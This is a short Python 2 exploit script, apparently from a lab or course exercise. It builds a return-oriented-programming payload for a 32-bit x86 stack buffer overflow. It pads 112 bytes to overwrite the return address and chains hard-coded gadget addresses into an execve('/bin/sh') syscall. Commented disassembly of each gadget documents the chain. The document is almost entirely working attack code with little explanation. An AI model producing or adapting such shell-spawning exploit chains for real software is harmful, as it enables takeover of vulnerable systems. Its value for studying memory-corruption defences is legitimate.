from shellcode import shellcode
from struct import pack

xoreax = pack("<L",0x806eca0)
popedx = pack("<L",0x805733a)
zeroaddr= pack("<L",0xbfff102c)
popecxthenebx= pack("<L",0x8057361)
popebx = pack("<L",0x8057362)

addeaxbythree= pack("<L",0x80abf20)
addeaxbyone= pack("<L",0x80abf10)
addeaxbytwo= pack("<L",0x80abf07)
addingeaxecxextra = pack("<L",0x80643ec )
syscall= pack("<L",0x8057ae0)
nops= pack("<L",0x90909090)
popeax = pack("<L",0x8085dbb)
#binshstringlocat= pack("<L",0xbffefff0)
#VM NEW binshstringlocat
binshstringlocat= pack("<L",0xbffede80)

negatievvaluefor18= pack("<L",0xDEEEFB07) 

print 'A'*(112) +xoreax +popecxthenebx+ negatievvaluefor18+'A' *4+ popeax + '\x04\x05\x11\x21' +addingeaxecxextra + 'C'*8 + popedx + zeroaddr + popecxthenebx + zeroaddr + 'A'*4 + popebx + binshstringlocat+ syscall+ "/bin/sh"
# addeaxby1

#+ addeaxby1
#+addeaxby3+addeaxby3+addeaxby1+addeaxby1 
#+ binshstringlocat 
#+addeaxby3+addeaxby3+addeaxby3+addeaxby1+addeaxby1 +syscall

#112 + overwrites eip
# has a 0 0xbfff102c
# 0xbffeff3c: start of buffer

 # 80bba42:	89 d8                	mov    %ebx,%eax
 # 80bba44:	5b                   	pop    %ebx
 # 80bba45:	5e                   	pop    %esi
 # 80bba46:	c3                   	ret    


# 8085dbb:	58                   	pop    %eax
#  8085dbc:	3d 01 f0 ff ff       	cmp    $0xfffff001,%eax
#  8085dc1:	0f 83 b9 28 fd ff    	jae    8058680 <__syscall_error>
#  8085dc7:	c3                   	ret    

 # 805733a:	5a                   	pop    %edx
 # 805733b:	c3                   	ret    

 # 8057ae0:	cd 80                	int    $0x80
 # 8057ae2:	c3                   	ret    
 
 #  80643ec:	01 c1                	add    %eax,%ecx
 # 80643ee:	89 c8                	mov    %ecx,%eax
 # 80643f0:	5b                   	pop    %ebx
 # 80643f1:	5e                   	pop    %esi 
# 
 # 80abf10:	83 c0 01             	add    $0x1,%eax
 # 80abf13:	c3                   	ret  

# 80abf20:	83 c0 03             	add    $0x3,%eax
#  80abf23:	c3                   	ret    

 # 8057361:	59                   	pop    %ecx
 # 8057362:	5b                   	pop    %ebx
 # 8057363:	c3                   	ret      

 # 806eca0:	31 c0                	xor    %eax,%eax
 # 806eca2:	c3                   	ret    
 #ebx get /bin/sh, eax gets 0b or 11, ecx edx get mem adddr that point to 0